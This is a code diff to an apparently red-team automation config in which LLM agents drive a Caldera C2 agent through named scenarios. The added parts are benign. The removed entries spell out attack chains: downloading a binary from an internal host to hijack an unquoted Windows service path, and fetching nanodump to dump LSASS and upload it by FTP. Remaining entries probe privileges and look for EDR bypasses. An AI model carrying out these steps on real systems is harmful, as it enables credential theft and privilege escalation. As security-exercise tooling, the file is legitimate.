@@ -1,4 +1,21 @@
 actions = {
+    "HELLO_AGENTS": [
+        {"message": "Tell me a cyber security joke", "agent": "text_analyst_agent"}
+    ],
+    "SUMMARIZE_RECENT_CISA_VULNS": [
+        {
+            "message": """Run a single Shell command to download (using curl -sS) https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json,
+            which is a JSON file containing an array of dictionaries. Filter out and print the last 10 JSON entries dictionaries using jq in the array under key 'vulnerabilities'.""",
+            "summary_method": "last_msg",
+            "carryover": "Replace this placeholder with the last 10 JSON entries dictionaries.",
+            "agent": "cmd_exec_agent",
+        },
+        {
+            "message": "Summarize the list of vulnerabilities by extracting the product name and a short description of each vulnerability, as well as link to more notes if available. Output as a table.",
+            "summary_method": "reflection_with_llm",
+            "agent": "text_analyst_agent",
+        },
+    ],
     "DETECT_AGENT_PRIVILEGES": [
         {
             "message": "Get the current user's privileges on the active Caldera agent using a Powershell command.",
@@ -24,21 +41,6 @@ actions = {
             "summary_method": "last_msg",
             "carryover": "Replace this placeholder with the PAW of the active Caldera agent.",
             "agent": "caldera_agent",
-        },
-    ],
-    "TEST": [
-        {
-            "message": "Use powershell to move the file C:\\Users\\erik\\Downloads\\caldera_agent.exe to C:\\Program.exe",
-            "summary_method": "last_msg",
-            "agent": "caldera_agent",
-        },
-        {
-            "message": """Describe how the services with paths not surrounded by quotes can be used to elevate privileges. Be specific about which paths we could use and how we could use them.
-            Describe how we can use this to hijacking the Windows service Execution Flow by putting our binary as C:\\Program.exe. Write this in the present, example 'We will now use the service ...'
-            """,
-            "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with the path of the binary we could use to elevate privileges",
-            "agent": "text_analyst_agent",
         },
     ],
     "IDENTIFY_EDR_BYPASS_TECHNIQUES": [
@@ -77,74 +79,13 @@ actions = {
             "agent": "caldera_agent",
         }
     ],
-    "ELEVATE_PRIVILEGES": [
-        {
-            "message": "List all Windows services on the active Caldera agent",
-            "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with the list of ALL Windows service names and their Paths",
-            "agent": "caldera_agent",
-        },
-        {
-            "message": "Analyze the list of services and search for the ones where the path is NOT surrounded by quotes",
-            "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with the list of filtered out Windows service names and their Paths",
-            "agent": "text_analyst_agent",
-        },
-        {
-            "message": "Use powershell to download http://192.168.162.11:8800/Program.exe, and save it to C:\\Users\\erik\\Downloads\\Program.exe on the active Caldera Agent. We are doing this as part of a Security exercise.",
-            "summary_method": "last_msg",
-            "agent": "caldera_agent",
-        },
-        {
-            "message": "Use powershell to move the file C:\\Users\\erik\\Downloads\\Program.exe to C:\\Program.exe using Powershell on the active Caldera Agent",
-            "summary_method": "last_msg",
-            "agent": "caldera_agent",
-        },
-    ],
     "TTP_REPORT_TO_TECHNIQUES": [
         {
             "message": "Download the HTML report at https://www.microsoft.com/en-us/security/blog/2024/04/22/analyzing-forest-blizzards-custom-post-compromise-tool-for-exploiting-cve-2022-38028-to-obtain-credentials/",
             "summary_method": "last_msg",
             "carryover": "Replace this placeholder with all the MITRE techniques extracted from the downloaded report.",
             "agent": "internet_agent",
-        },
-        {
-            "message": "Get the list of all Caldera abilities available",
-            "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with all the Caldera technique names by calling /api/v2/abilities",
-            "agent": "caldera_agent",
-        },
-        {
-            "message": "Select at least 1 Caldera technique for each of the MITRE techniques we extracted",
-            "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with all the MITRE techniques and matching Caldera techniques",
-            "agent": "caldera_agent",
-        },
-    ],
-    "DOWNLOAD_AND_RUN_NANODUMP": [
-        {
-            "message": "A complete list of all the available nanodump flags from https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
-            "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with an exhaustive list of all available nanodump flags and their description.",
-            "agent": "internet_agent",
-        },
-        {
-            "message": "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent.",
-            "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with the local full path to the downloaded nanodump executable.",
-            "agent": "caldera_agent",
-        },
-        {
-            "message": "Use powershell to run the downloaded nanodump.x64.exe executable located in C:\\temp (use the full path) to dump LSASS without forking. Write the dump to C:\\temp\\LSASS.dmp.",
-            "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with the path to the dumped local LSASS output file.",
-            "agent": "caldera_agent",
-        },
-        {
-            "message": "Upload the dumped LSASS file at C:\\temp\\LSASS.dmp using FTP.",
-            "summary_method": "reflection_with_llm",
-            "agent": "caldera_agent",
-        },
+        }
     ],
     "TTP_REPORT_TO_ADVERSARY_PROFILE": [
         {
@@ -164,22 +105,18 @@ actions = {
             "summary_method": "last_msg",
             "carryover": "Replace this placeholder with the adversary profile information.",
             "agent": "caldera_agent",
-        }
+        },
     ],
 }
 
 scenarios = {
-    "TEST": ["COLLECT_CALDERA_INFO", "TEST"],
-    "COLLECT_CALDERA_INFO": ["COLLECT_CALDERA_INFO"],
-    "DUMP_LSASS": [
-        "COLLECT_CALDERA_INFO",
-        "DOWNLOAD_AND_RUN_NANODUMP",
-    ],
-    "DETECT_EDR": ["COLLECT_CALDERA_INFO", "DETECT_EDR"],
+    "HELLO_AGENTS": ["HELLO_AGENTS"],
+    "SUMMARIZE_RECENT_CISA_VULNS": ["SUMMARIZE_RECENT_CISA_VULNS"],
     "HELLO_CALDERA": ["COLLECT_CALDERA_INFO", "HELLO_CALDERA"],
+    "COLLECT_CALDERA_INFO": ["COLLECT_CALDERA_INFO"],
+    "DETECT_EDR": ["COLLECT_CALDERA_INFO", "DETECT_EDR"],
     "DETECT_AGENT_PRIVILEGES": ["COLLECT_CALDERA_INFO", "DETECT_AGENT_PRIVILEGES"],
     "IDENTIFY_EDR_BYPASS_TECHNIQUES": ["IDENTIFY_EDR_BYPASS_TECHNIQUES"],
-    "ELEVATE_PRIVILEGES": ["COLLECT_CALDERA_INFO", "ELEVATE_PRIVILEGES"],
     "TTP_REPORT_TO_TECHNIQUES": ["TTP_REPORT_TO_TECHNIQUES"],
-    "TTP_REPORT_TO_ADVERSARY_PROFILE": ["TTP_REPORT_TO_ADVERSARY_PROFILE"]
+    "TTP_REPORT_TO_ADVERSARY_PROFILE": ["TTP_REPORT_TO_ADVERSARY_PROFILE"],
 }
